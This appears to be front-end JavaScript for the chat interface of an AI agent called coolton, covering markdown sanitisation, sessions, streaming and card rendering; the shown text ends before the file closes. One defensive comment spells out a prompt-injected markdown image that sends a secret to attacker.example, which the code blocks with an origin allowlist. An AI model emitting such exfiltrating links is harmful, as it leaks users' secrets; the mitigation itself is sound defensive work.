(function () {
  'use strict';

  // ---------------------------------------------------------------------
  // Markdown rendering: marked -> highlight.js (per code block) -> DOMPurify
  // ---------------------------------------------------------------------

  function escapeHtml(s) {
    return s.replace(/[&<>"']/g, (c) => ({
      '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
    }[c]));
  }

  const IMAGE_EXTENSIONS = /\.(png|jpe?g|gif|webp|svg|bmp|avif|ico)$/i;
  function isImageFilename(name) {
    return IMAGE_EXTENSIONS.test((name || '').split(/[?#]/)[0]);
  }

  // Every current event producer builds ev.url server-side from a fixed
  // template (a coolton file-server link, a whiteboard/desktop-stream URL),
  // so there's no live path from model output to here today — but
  // Surface.post_embed/post_image/post_file_link are public methods, and an
  // unvalidated string handed straight to iframe.src/a.href/img.src is one
  // future tool call away from a "javascript:" URL executing in this page's
  // origin. Only ever assign a value this has approved.
  function safeUrl(url) {
    if (typeof url !== 'string' || !url) return '';
    try {
      const resolved = new URL(url, window.location.href);
      return (resolved.protocol === 'http:' || resolved.protocol === 'https:') ? url : '';
    } catch (e) {
      return '';
    }
  }

  const mdRenderer = new marked.Renderer();
  mdRenderer.code = function (code, infostring) {
    const lang = (infostring || '').trim().split(/\s+/)[0];
    let html;
    try {
      if (lang && window.hljs && hljs.getLanguage(lang)) {
        html = hljs.highlight(code, { language: lang }).value;
      } else if (window.hljs) {
        html = hljs.highlightAuto(code).value;
      } else {
        html = escapeHtml(code);
      }
    } catch (e) {
      html = escapeHtml(code);
    }
    return `<pre><code class="hljs language-${lang || ''}">${html}</code></pre>`;
  };
  marked.setOptions({ gfm: true, breaks: false, renderer: mdRenderer });

  // ---------------------------------------------------------------------
  // Emoji shortcodes (:tada:, :white_check_mark:, ...) -> real Unicode glyphs.
  // Slack renders these inline; a bare browser doesn't, so the map does it here.
  // ---------------------------------------------------------------------

  let EMOJI_MAP = null;
  const emojiMapReady = fetch('/static/vendor/emoji-map.json')
    .then((r) => r.json())
    .then((m) => { EMOJI_MAP = m; })
    .catch(() => { EMOJI_MAP = {}; });

  // Not every standard Slack emoji (e.g. custom workspace emoji) resolves to
  // Unicode. cachet.dunkirk.sh mirrors Slack's custom emoji by name and
  // redirects /emojis/<name>/r to the actual image.
  const CUSTOM_EMOJI_URL = (name) => `https://cachet.dunkirk.sh/emojis/${encodeURIComponent(name)}/r`;

  function emojiFor(name) {
    if (!EMOJI_MAP) return null;
    const key = name.toLowerCase();
    if (EMOJI_MAP[key]) return EMOJI_MAP[key];
    const swapped = key.includes('-') ? key.replace(/-/g, '_') : key.replace(/_/g, '-');
    return EMOJI_MAP[swapped] || null;
  }

  function convertShortcodes(text) {
    if (!EMOJI_MAP || !text) return text;
    return text.replace(/:([a-z0-9_+\-]+):/gi, (match, name) => emojiFor(name) || match);
  }

  // Same as convertShortcodes, but for text headed into innerHTML: unresolved
  // names become an <img> for a custom emoji instead of staying as ":name:".
  function convertShortcodesHTML(text) {
    if (!EMOJI_MAP || !text) return text;
    return text.replace(/:([a-z0-9_+\-]+):/gi, (match, name) => {
      const glyph = emojiFor(name);
      if (glyph) return glyph;
      return `<img class="emoji-img" src="${CUSTOM_EMOJI_URL(name)}" alt="${match}" title="${match}">`;
    });
  }

  // Model output can carry an image built to leak something (a prompt-injected
  // `![](https://attacker.example/?q=<secret>)`): rendering it makes the browser fetch
  // that URL. Only images from here, custom emoji and inline data load; any other
  // image becomes a plain link to it.
  const LOADABLE_IMAGE_ORIGINS = new Set([window.location.origin, 'https://cachet.dunkirk.sh']);
  function isLoadableImage(src) {
    try {
      const url = new URL(src || '', window.location.href);
      return url.protocol === 'data:' || LOADABLE_IMAGE_ORIGINS.has(url.origin);
    } catch (e) {
      return false;
    }
  }

  function renderMarkdown(text) {
    const raw = marked.parse(convertShortcodesHTML(text || ''));
    // A <template> parses without loading anything, so blocked images never fetch.
    const template = document.createElement('template');
    template.innerHTML = DOMPurify.sanitize(raw, { ADD_ATTR: ['target', 'rel'] });
    template.content.querySelectorAll('img').forEach((img) => {
      if (isLoadableImage(img.getAttribute('src'))) return;
      const link = document.createElement('a');
      link.href = safeUrl(img.getAttribute('src')) || '#';
      link.textContent = img.getAttribute('alt') || 'image';
      img.replaceWith(link);
    });
    return template.innerHTML;
  }

  function linkifyExternal(container) {
    container.querySelectorAll('a[href]').forEach((a) => {
      a.setAttribute('target', '_blank');
      a.setAttribute('rel', 'noopener noreferrer');
    });
  }

  function fmtElapsed(seconds) {
    if (seconds < 1) return `${Math.round(seconds * 1000)}ms`;
    if (seconds < 60) return `${seconds.toFixed(1)}s`;
    return `${Math.floor(seconds / 60)}m${Math.round(seconds % 60)}s`;
  }

  function fmtClock(ts) {
    if (!ts) return '';
    return new Date(ts * 1000).toTimeString().slice(0, 5); // HH:MM
  }

  function fmtSidebarTime(ts) {
    if (!ts) return '';
    const d = new Date(ts * 1000);
    const now = new Date();
    if (d.toDateString() === now.toDateString()) return d.toTimeString().slice(0, 5);
    const year = d.getFullYear() === now.getFullYear() ? undefined : 'numeric';
    return d.toLocaleDateString(undefined, { month: 'short', day: 'numeric', year });
  }

  // coolton's own status vocabulary, from its system prompt — reused here so the
  // UI names each step the same way the agent does.
  const MARKERS = { in_progress: '◐', complete: '●', error: '✕' };
  const UNTITLED = 'Untitled session';

  // ---------------------------------------------------------------------
  // DOM refs
  // ---------------------------------------------------------------------

  const $ = (id) => document.getElementById(id);
  const appEl = $('app');
  const drawerToggle = $('drawerToggle');
  const backdrop = $('backdrop');
  const convoListEl = $('conversationList');
  const userFooterEl = $('userFooter');
  const newConvoBtn = $('newConversationBtn');
  const statusTitleEl = $('statusTitle');
  const statusStateEls = [$('statusStateHeader'), $('statusStateComposer')];
  const transcriptEl = $('transcript');
  const emptyStateEl = $('emptyState');
  const composerEl = $('composer');
  const composerInput = $('composerInput');
  const sendBtn = $('sendBtn');
  const stopBtn = $('stopBtn');
  const attachBtn = $('attachBtn');
  const fileInput = $('fileInput');
  const attachmentTray = $('attachmentTray');
  const tplUserMessage = $('tpl-user-message');
  const tplTurn = $('tpl-turn');
  const tplSpineNode = $('tpl-spine-node');
  const tplPolicyPrompt = $('tpl-policy-prompt');
  const mdToolbar = $('mdToolbar');
  const sidebarResizer = $('sidebarResizer');
  const settingsModal = $('settingsModal');
  const settingsNav = $('settingsNav');
  const settingsBody = $('settingsBody');
  const settingsCloseBtn = $('settingsClose');

  // ---------------------------------------------------------------------
  // Local persistence: composer drafts and sidebar width. Both are just the
  // user's own browser state — nothing sensitive, nothing server-side.
  // ---------------------------------------------------------------------

  const DRAFT_PREFIX = 'coolton.web.draft.';
  const SIDEBAR_W_KEY = 'coolton.web.sidebarW';
  const SIDEBAR_MIN = 190;
  const SIDEBAR_MAX = 480;

  function draftKey() {
    return DRAFT_PREFIX + (currentConversationId || 'new');
  }

  // ---------------------------------------------------------------------
  // State
  // ---------------------------------------------------------------------

  let me = null;
  let currentConversationId = null;
  let eventSource = null;
  let activeTurnEl = null;
  let spineNodeByStepId = new Map();
  let stepStartTs = new Map();
  let messageElBySeq = new Map();
  let pendingAttachments = []; // [{id, url, name, mime, size}]
  let pendingOptimistic = []; // user messages rendered locally before their server event arrives
  let isWorking = false;
  let isStopping = false;

  // ---------------------------------------------------------------------
  // API helpers
  // ---------------------------------------------------------------------

  async function api(path, opts) {
    const resp = await fetch(path, { credentials: 'same-origin', ...opts });
    if (resp.status === 401) {
      window.location.href = '/oauth/login';
      throw new Error('unauthenticated');
    }
    return resp;
  }

  async function apiJson(path, opts) {
    const resp = await api(path, opts);
    if (!resp.ok) throw new Error(`${path} -> ${resp.status}`);
    return resp.json();
  }

  function icon(id, className) {
    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('class', className || 'icon');
    svg.setAttribute('viewBox', '0 0 24 24');
    const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
    use.setAttribute('href', `#${id}`);
    svg.appendChild(use);
    return svg;
  }

  // ---------------------------------------------------------------------
  // Sidebar / conversations
  // ---------------------------------------------------------------------

  async function loadMe() {
    me = await apiJson('/api/me');
    userFooterEl.innerHTML = '';
    const img = document.createElement('img');
    img.src = me.avatar_url;
    img.alt = '';
    const name = document.createElement('span');
    name.textContent = me.display_name;
    const settingsBtn = document.createElement('button');
    settingsBtn.type = 'button';
    settingsBtn.className = 'footer-settings';
    settingsBtn.title = 'Settings';
    settingsBtn.setAttribute('aria-label', 'Open settings');
    settingsBtn.appendChild(icon('i-settings'));
    settingsBtn.addEventListener('click', openSettings);
    userFooterEl.append(img, name, settingsBtn);
  }

  async function loadConversations(selectId, selectOpts) {
    const rows = await apiJson('/api/conversations');
    convoListEl.innerHTML = '';

    if (!rows.length) {
      const empty = document.createElement('p');
      empty.className = 'session-empty';
      empty.textContent = 'No sessions yet.';
      convoListEl.appendChild(empty);
    }

    for (const row of rows) {
      convoListEl.appendChild(buildSessionItem(row));
    }

    if (selectId && rows.some((r) => r.id === selectId)) {
      await selectConversation(selectId, selectOpts);
    } else if (selectId) {
      // The URL (bookmark, reload, back/forward) pointed at a session that no
      // longer exists or isn't ours — draft, not a silent 404. Scrub the
      // stale id out of the address bar rather than leaving it pointed at
      // something that isn't actually what's on screen.
      showDraftState({ skipHistory: true });
      history.replaceState(null, '', location.pathname);
    } else if (currentConversationId && rows.some((r) => r.id === currentConversationId)) {
      markSidebarActive(currentConversationId);
    } else if (!currentConversationId) {
      // No id in the URL and nothing already open: this is "/" itself, which
      // is the same starting point as clicking New session, not a jump into
      // whatever session happens to be most recent.
      showDraftState({ skipHistory: true });
    }
  }

  function buildSessionItem(row) {
    const item = document.createElement('div');
    item.className = 'session-item';
    item.dataset.id = row.id;
    const title = (row.title || '').trim();
    if (!title) item.classList.add('untitled');
    if (row.id === currentConversationId) item.classList.add('active');
    if (row.working) item.classList.add('working');

    const open = document.createElement('button');
    open.type = 'button';
    open.className = 'session-open';

    const titleEl = document.createElement('span');
    titleEl.className = 'session-item-title';
    titleEl.textContent = title || UNTITLED;

    const timeEl = document.createElement('span');
    timeEl.className = 'session-item-time';
    timeEl.textContent = fmtSidebarTime(row.updated_at);

    open.append(titleEl, timeEl);
    open.addEventListener('click', () => { selectConversation(row.id); closeDrawer(); });

    const live = document.createElement('span');
    live.className = 'session-item-live';
    live.title = 'coolton is working in this session';

    const del = document.createElement('button');
    del.type = 'button';
    del.className = 'session-delete';
    del.title = 'Delete this session';
    del.setAttribute('aria-label', `Delete ${title || UNTITLED}`);
    del.appendChild(icon('i-trash'));

    // Deleting a transcript is not undoable, so it asks — in the row itself,
    // where the thing being deleted is, rather than in a browser dialog.
    const confirmBar = document.createElement('div');
    confirmBar.className = 'session-confirm';
    confirmBar.hidden = true;
    const confirmText = document.createElement('span');
    confirmText.textContent = 'Delete?';
    const yes = document.createElement('button');
    yes.type = 'button';
    yes.className = 'confirm-yes';
    yes.textContent = 'Delete';
    const no = document.createElement('button');
    no.type = 'button';
    no.className = 'confirm-no';
    no.textContent = 'Keep';
    confirmBar.append(confirmText, yes, no);

    const closeConfirm = () => {
      confirmBar.hidden = true;
      item.classList.remove('confirming');
      document.removeEventListener('keydown', onKey, true);
    };
    function onKey(e) { if (e.key === 'Escape') closeConfirm(); }

    del.addEventListener('click', () => {
      convoListEl.querySelectorAll('.session-item.confirming').forEach((el) => {
        el.classList.remove('confirming');
        el.querySelector('.session-confirm').hidden = true;
      });
      confirmBar.hidden = false;
      item.classList.add('confirming');
      document.addEventListener('keydown', onKey, true);
      no.focus();
    });
    no.addEventListener('click', closeConfirm);
    yes.addEventListener('click', () => { closeConfirm(); deleteConversation(row.id); });

    item.append(open, live, del, confirmBar);
    return item;
  }

  function markSidebarActive(id) {
    convoListEl.querySelectorAll('.session-item').forEach((b) => {
      b.classList.toggle('active', b.dataset.id === id);
    });
  }

  function markSidebarWorking(id, working) {
    const btn = convoListEl.querySelector(`.session-item[data-id="${CSS.escape(id)}"]`);
    if (btn) btn.classList.toggle('working', working);
  }

  function setSidebarTitle(id, title) {
    const btn = convoListEl.querySelector(`.session-item[data-id="${CSS.escape(id)}"]`);
    if (!btn) return;
    btn.classList.toggle('untitled', !title);
    btn.querySelector('.session-item-title').textContent = title || UNTITLED;
  }

  async function createConversation() {
    const meta = await apiJson('/api/conversations', { method: 'POST' });
    await loadConversations(meta.id);
    closeDrawer();
    composerInput.focus();
    return meta.id;
  }

  async function deleteConversation(id) {
    try {
      await api(`/api/conversations/${id}`, { method: 'DELETE' });
    } catch (err) {
      console.error('Failed to delete session', err);
      return;
    }
    if (id === currentConversationId) showDraftState();
    await loadConversations();
  }

  function showEmptyState() {
    transcriptEl.innerHTML = '';
    transcriptEl.appendChild(emptyStateEl);
    emptyStateEl.hidden = false;
  }

  // The state "/" and New session both land on: nothing is created (and
  // nothing hits the network) until the first message actually sends — see
  // the composer submit handler, the only place that calls createConversation.
  function showDraftState(opts) {
    if (eventSource) { eventSource.close(); eventSource = null; }
    currentConversationId = null;
    activeTurnEl = null;
    spineNodeByStepId = new Map();
    stepStartTs = new Map();
    messageElBySeq = new Map();
    isWorking = false;
    isStopping = false;
    updateComposerState();
    updateStatusBar();
    markSidebarActive(null);
    statusTitleEl.textContent = 'New session';
    showEmptyState();
    if (!opts || !opts.skipHistory) history.pushState(null, '', location.pathname);
  }

  // A real link, not a script-driven redirect — clicking it is the deliberate
  // action that was missing (see /oauth/logout's comment for why landing on
  // "/" after sign-out silently re-authorized before the user saw anything).
  function renderAuthScreen(message) {
    appEl.hidden = true;
    const screen = document.createElement('div');
    screen.className = 'auth-screen';
    screen.innerHTML = `
      <img src="/static/coolton.png" alt="">
      <p>${message}</p>
      <a href="/oauth/login" class="auth-signin">Sign in</a>
    `;
    document.body.appendChild(screen);
  }

  async function selectConversation(id, opts) {
    if (eventSource) { eventSource.close(); eventSource = null; }
    currentConversationId = id;
    activeTurnEl = null;
    spineNodeByStepId = new Map();
    stepStartTs = new Map();
    messageElBySeq = new Map();
    isWorking = false;
    isStopping = false;
    updateComposerState();
    updateStatusBar();
    markSidebarActive(id);
    // Bookmarkable, reloadable, and back/forward-able — reloading this exact
    // URL later re-opens this same session (see loadConversations reading it
    // back on init, and the popstate handler for back/forward).
    if (!opts || !opts.skipHistory) {
      history.pushState(null, '', `${location.pathname}?c=${encodeURIComponent(id)}`);
    }

    transcriptEl.innerHTML = '';
    const data = await apiJson(`/api/conversations/${id}`);
    statusTitleEl.textContent = (data.meta && data.meta.title) || UNTITLED;

    let lastSeq = 0;
    for (const ev of data.events) {
      handleEvent(ev, { replay: true });
      lastSeq = Math.max(lastSeq, ev.seq || 0);
    }
    // A turn left open by replay means it's genuinely still running right now.
    if (activeTurnEl) {
      isWorking = true;
      updateComposerState();
      updateStatusBar('working');
    }
    if (!data.events.length) {
      // Same copy as the pre-sign-in empty state (#emptyState in index.html) —
      // an empty conversation isn't a different situation from never having
      // started one, so it shouldn't say something different.
      const empty = emptyStateEl.cloneNode(true);
      empty.removeAttribute('id');
      empty.hidden = false;
      transcriptEl.appendChild(empty);
    }
    scrollToBottom();
    connectStream(id, lastSeq);
  }

  function connectStream(id, after) {
    let lastSeq = after;
    let socket = null;
    let reconnectTimer = null;
    const seenSeqs = new Set();

    function open() {
      if (id !== currentConversationId || document.hidden) return;
      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
      socket = new WebSocket(`${protocol}//${location.host}/ws/conversations/${encodeURIComponent(id)}?after=${lastSeq}`);
      eventSource = socket;

      socket.onmessage = (msg) => {
        let ev;
        try { ev = JSON.parse(msg.data); } catch (e) { return; }
        if (id !== currentConversationId) return;
        if (ev.seq != null) {
          if (seenSeqs.has(ev.seq)) return;
          seenSeqs.add(ev.seq);
          lastSeq = Math.max(lastSeq, ev.seq);
        }
        if (transcriptEl.querySelector('.empty-state')) transcriptEl.innerHTML = '';
        handleEvent(ev);
        scrollToBottomIfNearBottom();
      };

      socket.onclose = () => {
        if (id !== currentConversationId) return;
        if (eventSource === socket) eventSource = null;
        clearTimeout(reconnectTimer);
        if (!document.hidden) reconnectTimer = setTimeout(open, 2000);
      };
      socket.onerror = () => socket.close();
    }

    open();

    window.addEventListener('beforeunload', () => {
      clearTimeout(reconnectTimer);
      if (socket) socket.close();
    }, { once: true });
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        clearTimeout(reconnectTimer);
        if (socket && socket.readyState === WebSocket.OPEN) socket.close();
      } else if (id === currentConversationId && (!socket || socket.readyState !== WebSocket.OPEN)) {
        clearTimeout(reconnectTimer);
        open();
      }
    });
  }

  function scrollToBottom() {
    transcriptEl.scrollTop = transcriptEl.scrollHeight;
  }

  function scrollToBottomIfNearBottom() {
    const nearBottom = transcriptEl.scrollHeight - transcriptEl.scrollTop - transcriptEl.clientHeight < 140;
    if (nearBottom) scrollToBottom();
  }

  // ---------------------------------------------------------------------
  // Event -> DOM
  // ---------------------------------------------------------------------

  function handleEvent(ev, opts) {
    switch (ev.type) {
      case 'user_message': return renderUserMessage(ev, opts);
      case 'policy_prompt': return renderPolicyPrompt(ev, opts);
      case 'turn_start': return startTurn(ev, opts);
      case 'turn_status': return setTurnStatus(ev, opts);
      case 'step': return handleStep(ev);
      case 'agent_message': return handleAgentMessage(ev);
      case 'turn_end': return endTurn(ev, opts);
      case 'reaction': return handleReaction(ev);
      default: return;
    }
  }

  function renderUserMessage(ev, opts) {
    // Optimistic send: a message we rendered the moment Enter was pressed has
    // its server event arrive here. Match it FIFO (the server appends user
    // messages in the same order) and morph the local copy into the real one
    // instead of rendering a second row. A mismatch (or a replay) falls
    // through to a normal render.
    if (!(opts && opts.replay) && pendingOptimistic.length) {
      const optimistic = pendingOptimistic.shift();
      if (optimistic.text === ev.text && optimistic.attachments === (ev.attachments || []).length) {
        optimistic.node.dataset.seq = ev.seq;
        optimistic.node.classList.remove('pending');
        optimistic.node.querySelector('.row-time').textContent = fmtClock(ev.ts);
        messageElBySeq.set(ev.seq, optimistic.node);
        messageElBySeq.delete('optimistic');
        return;
      }
      optimistic.node.remove();
    }

    const node = buildUserMessageNode(ev);
    transcriptEl.appendChild(node);
    messageElBySeq.set(ev.seq, node);
    // A message sent while a turn is still running is steering, not a new
    // turn — the run in flight folds it in and keeps going, ending with the
    // same turn_end. Only clear activeTurnEl for a genuine new turn, or
    // ensureTurn() spins up a second `.turn.working` row for the rest of the
    // steered turn's events, and the eventual turn_end (which only ever
    // touches activeTurnEl) leaves the first row animating "working" forever.
    if (!activeTurnEl || !activeTurnEl.classList.contains('working')) {
      activeTurnEl = null;
    }
  }

  function buildUserMessageNode(ev) {
    const node = tplUserMessage.content.firstElementChild.cloneNode(true);
    node.dataset.seq = ev.seq;
    node.querySelector('.row-time').textContent = fmtClock(ev.ts);

    const img = node.querySelector('.actor-avatar');
    const mine = me && ev.user_id === me.slack_id;
    img.src = mine ? me.avatar_url : `https://cachet.dunkirk.sh/users/${encodeURIComponent(ev.user_id || '')}/r`;
    node.querySelector('.actor-name').textContent = mine ? (me.display_name || 'You') : (ev.user_id || 'Someone');
    // User messages render markdown exactly like coolton's own — the toolbar
    // inserts the syntax, but typing it by hand works the same way.
    const textEl = node.querySelector('.row-text');
    textEl.classList.add('md');
    textEl.innerHTML = renderMarkdown(convertShortcodesHTML(ev.text || ''));
    linkifyExternal(textEl);

    const attachEl = node.querySelector('.row-attachments');
    for (const a of ev.attachments || []) attachEl.appendChild(renderAttachmentChip(a));
    return node;
  }

  // A local copy of the message being sent, so the transcript updates the
  // instant Enter is pressed instead of waiting for the server round-trip.
  function renderOptimisticUserMessage(text, attachments) {
    const node = buildUserMessageNode({
      seq: null, ts: Date.now() / 1000, text,
      user_id: me ? me.slack_id : null, attachments,
    });
    node.classList.add('pending');
    node.querySelector('.row-time').textContent = '';
    transcriptEl.appendChild(node);
    messageElBySeq.set('optimistic', node);
    pendingOptimistic.push({ node, text, attachments: (attachments || []).length });
    scrollToBottom();
    return node;
  }

  function renderPolicyPrompt(ev) {
    if (me && me.policy_consent) return;
    const node = tplTurn.content.firstElementChild.cloneNode(true);
    node.classList.remove('working');
    node.querySelector('.spine-group').remove();
    node.querySelector('.row-time').textContent = fmtClock(ev.ts);
    const content = node.querySelector('.turn-content');
    const prompt = tplPolicyPrompt.content.firstElementChild.cloneNode(true);
    const link = prompt.querySelector('a');
    link.href = policyUrl();
    link.textContent = 'Coolton policy';
    const join = prompt.querySelector('.policy-join');
    const nojoin = prompt.querySelector('.policy-nojoin');
    join.addEventListener('click', () => acceptPolicy(true, node));
    nojoin.addEventListener('click', () => acceptPolicy(false, node));
    content.appendChild(prompt);
    transcriptEl.appendChild(node);
  }

  let _policyUrl = '';
  function policyUrl() {
    return _policyUrl || 'https://hackclub.enterprise.slack.com/docs/T0266FRGM/F0BQMKLK5MJ';
  }

  async function acceptPolicy(join, promptNode) {
    try {
      await apiJson('/api/settings/policy/opt-in', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ join }),
      });
      me.policy_consent = true;
      document.querySelectorAll('.policy-prompt').forEach((p) => {
        const row = p.closest('.row');
        if (row && row.parentElement === transcriptEl) row.remove();
      });
      if (!settingsModal.hidden) refreshSettings();
    } catch (err) {
      if (promptNode) {
        const note = document.createElement('div');
        note.className = 'policy-prompt-note';
        note.textContent = 'Something went wrong recording your opt-in — please try again.';
        promptNode.appendChild(note);
      }
    }
  }

  function renderAttachmentChip(a) {
    const chip = document.createElement('div');
    chip.className = 'attachment-chip';
    if ((a.mime || a.media_type || '').startsWith('image/')) {
      const img = document.createElement('img');
      img.src = a.url || `/api/files/${a.id}`;
      img.alt = a.name || '';
      chip.appendChild(img);
    } else {
      chip.textContent = a.name || a.id;
    }
    return chip;
  }

  function startTurn(ev, opts) {
    const node = tplTurn.content.firstElementChild.cloneNode(true);
    node.dataset.seq = ev.seq;
    node.querySelector('.row-time').textContent = fmtClock(ev.ts);
    node.querySelector('.spine-head').addEventListener('click', () => {
      node.classList.toggle('steps-collapsed');
    });
    transcriptEl.appendChild(node);
    activeTurnEl = node;
    spineNodeByStepId = new Map();
    stepStartTs = new Map();
    if (opts && opts.replay) return;
    startThinking(node);
    isWorking = true;
    isStopping = false;
    updateComposerState();
    updateStatusBar('working');
    markSidebarWorking(currentConversationId, true);
    refreshSidebarMeta();
  }

  function ensureTurn() {
    if (!activeTurnEl) startTurn({ seq: 0, ts: Date.now() / 1000 }, { replay: true });
    return activeTurnEl;
  }

  function setTurnStatus(ev, opts) {
    ensureTurn();
    if (opts && opts.replay) return;
    updateStatusBar('working', ev.text);
  }

  function updateStatusBar(state, text) {
    if (state) isWorking = state === 'working';
    const label = !isWorking ? 'Idle' : isStopping ? 'Stopping…' : convertShortcodes(text || 'Working');
    for (const el of statusStateEls) {
      el.classList.toggle('working', isWorking && !isStopping);
      el.classList.toggle('stopping', isWorking && isStopping);
      el.querySelector('.status-state-text').textContent = label;
    }
  }

  function startThinking(turn) {
    if (!turn || turn.querySelector('.thinking')) return;
    const think = document.createElement('div');
    think.className = 'thinking';
    think.setAttribute('aria-label', 'coolton is thinking');
    think.append(
      el('span', 'thinking-dot', '●'),
      el('span', 'thinking-dot', '●'),
      el('span', 'thinking-dot', '●')
    );
    turn.querySelector('.turn-content').appendChild(think);
  }

  function clearThinking(turn) {
    if (!turn) return;
    const think = turn.querySelector('.thinking');
    if (think) think.remove();
  }

  function showSpineGroup(turn) {
    turn.querySelector('.spine-group').hidden = false;
    return turn.querySelector('.spine');
  }

  function updateStepCount(turn) {
    const n = turn.querySelectorAll('.spine-node').length;
    turn.querySelector('.spine-count').textContent = `${n} step${n === 1 ? '' : 's'}`;
  }

  function newSpineNode(status, kind) {
    const node = tplSpineNode.content.firstElementChild.cloneNode(true);
    node.dataset.status = status;
    if (kind) node.dataset.kind = kind;
    node.querySelector('.spine-marker').textContent = MARKERS[status] || MARKERS.in_progress;
    return node;
  }

  function handleStep(ev) {
    const turn = ensureTurn();
    const spine = showSpineGroup(turn);
    clearThinking(turn);

    if (ev.kind === 'model') {
      const node = newSpineNode('complete', 'model');
      node.querySelector('.spine-title').textContent = `Model: ${ev.text}`;
      node.querySelector('.spine-line').disabled = true;
      spine.appendChild(node);
      updateStepCount(turn);
      return;
    }

    if (ev.kind === 'reasoning') {
      const node = newSpineNode('complete', 'reasoning');
      node.querySelector('.spine-title').textContent = 'Thought it through';
      wireSpineToggle(node);
      node.querySelector('.spine-result').textContent = ev.text || '';
      spine.appendChild(node);
      updateStepCount(turn);
      return;
    }

    if (ev.kind === 'tool') {
      let node = spineNodeByStepId.get(ev.step_id);
      if (!node) {
        node = newSpineNode(ev.status, 'tool');
        wireSpineToggle(node);
        spine.appendChild(node);
        spineNodeByStepId.set(ev.step_id, node);
        stepStartTs.set(ev.step_id, ev.ts);
        updateStepCount(turn);
      }
      node.dataset.status = ev.status;
      node.querySelector('.spine-marker').textContent = MARKERS[ev.status] || MARKERS.in_progress;
      node.querySelector('.spine-title').textContent = ev.display || ev.tool_name;

      if (ev.status === 'in_progress' && ev.args) {
        node.querySelector('.spine-args').innerHTML = renderKvTable(ev.args);
      }
      if ((ev.status === 'complete' || ev.status === 'error') && ev.result !== undefined) {
        const resultEl = node.querySelector('.spine-result');
        resultEl.textContent = typeof ev.result === 'string' ? ev.result : JSON.stringify(ev.result, null, 2);
        const started = stepStartTs.get(ev.step_id);
        if (started) node.querySelector('.spine-time').textContent = fmtElapsed(ev.ts - started);
      }
    }
  }

  function wireSpineToggle(node) {
    const head = node.querySelector('.spine-line');
    const body = node.querySelector('.spine-detail');
    head.addEventListener('click', () => {
      body.hidden = !body.hidden;
      node.classList.toggle('open', !body.hidden);
    });
  }

  function renderKvTable(obj) {
    if (obj === null || typeof obj !== 'object') {
      return `<div class="kv-table">${escapeHtml(String(obj))}</div>`;
    }
    const rows = Object.entries(obj).map(([k, v]) => {
      const val = typeof v === 'string' ? v : JSON.stringify(v, null, 2);
      return `<tr><td>${escapeHtml(k)}</td><td>${escapeHtml(val)}</td></tr>`;
    }).join('');
    return `<table class="kv-table">${rows}</table>`;
  }

  // ---------------------------------------------------------------------
  // Cards: the Slack Block Kit coolton posts with send_card_tool, drawn here
  // (agent/tools/json_render_card.py). Every string from the blocks goes in
  // through textContent or the sanitizing Markdown renderer, never raw HTML.
  // ---------------------------------------------------------------------

  let cardPromptSender = null;
  // Categorical order for chart series, stepped for this dark surface
  // (passes the dataviz palette checks on --panel).
  const SERIES_COLORS = ['#3987e5', '#d95926', '#199e70', '#c98500', '#d55181', '#008300', '#9085e9', '#e66767'];
  const SVG_NS = 'http://www.w3.org/2000/svg';

  function el(tag, className, text) {
    const node = document.createElement(tag);
    if (className) node.className = className;
    if (text !== undefined) node.textContent = text;
    return node;
  }

  function svgEl(tag, attrs) {
    const node = document.createElementNS(SVG_NS, tag);
    for (const [k, v] of Object.entries(attrs || {})) node.setAttribute(k, v);
    return node;
  }

  // Slack mrkdwn -> Markdown, then the usual sanitized render.
  function mrkdwnToHtml(text) {
    const md = String(text || '')
      .replace(/<(https?:\/\/[^|>]+)\|([^>]+)>/g, '[$2]($1)')
      .replace(/<(https?:\/\/[^>]+)>/g, '$1')
      .replace(/<@([A-Z0-9]+)>/g, '@$1')
      .replace(/<#([A-Z0-9]+)(\|[^>]*)?>/g, '#$1')
      .replace(/(^|[\s(])\*([^*\n]+)\*(?=[\s).,!?:;]|$)/g, '$1**$2**')
      .replace(/(^|[\s(])~([^~\n]+)~(?=[\s).,!?:;]|$)/g, '$1~~$2~~')
      // Slack keeps single line breaks (a field's label, then its value).
      .replace(/\n/g, '  \n');
    return renderMarkdown(md);
  }

  function textOf(obj) {
    return (obj && obj.text) || '';
  }

  function renderTable(block) {
    const wrap = el('div', 'bk-table-wrap');
    const table = el('table', 'bk-table');
    if (block.caption) table.appendChild(el('caption', '', block.caption));
    const rows = block.rows || [];
    const cell = (c) => (c && (c.text !== undefined ? String(c.text) : c.value !== undefined ? String(c.value) : '')) || '';
    const numeric = (rows[0] || []).map((_, i) => rows.slice(1).length > 0 &&
      rows.slice(1).every((r) => /^[-+$€£]?[\d.,]+[%kKmMbB]?$/.test(cell(r[i]).trim())));
    const thead = el('thead');
    const head = el('tr');
    (rows[0] || []).forEach((c, i) => {
      const th = el('th', numeric[i] ? 'num' : '', cell(c));
      if (block.type === 'data_table') {
        th.tabIndex = 0;
        th.title = 'Sort';
        const sort = () => {
          const dir = th.dataset.dir === 'asc' ? 'desc' : 'asc';
          head.querySelectorAll('th').forEach((h) => delete h.dataset.dir);
          th.dataset.dir = dir;
          const value = (r) => {
            const t = r.children[i].textContent;
            const n = parseFloat(t.replace(/[^\d.-]/g, ''));
            return numeric[i] && !isNaN(n) ? n : t.toLowerCase();
          };
          const sorted = [...tbody.children].sort((a, b) => (value(a) > value(b) ? 1 : value(a) < value(b) ? -1 : 0));
          if (dir === 'desc') sorted.reverse();
          sorted.forEach((r) => tbody.appendChild(r));
        };
        th.addEventListener('click', sort);
        th.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); sort(); } });
      }
      head.appendChild(th);
    });
    thead.appendChild(head);
    const tbody = el('tbody');
    rows.slice(1).forEach((r) => {
      const tr = el('tr');
      r.forEach((c, i) => tr.appendChild(el('td', numeric[i] ? 'num' : '', cell(c))));
      tbody.appendChild(tr);
    });
    table.append(thead, tbody);
    wrap.appendChild(table);
    return wrap;
  }

  function fmtNum(n) {
    if (Math.abs(n) >= 1e9) return `${+(n / 1e9).toFixed(1)}B`;
    if (Math.abs(n) >= 1e6) return `${+(n / 1e6).toFixed(1)}M`;
    if (Math.abs(n) >= 1e4) return `${+(n / 1e3).toFixed(1)}k`;
    return String(+n.toFixed(2));
  }

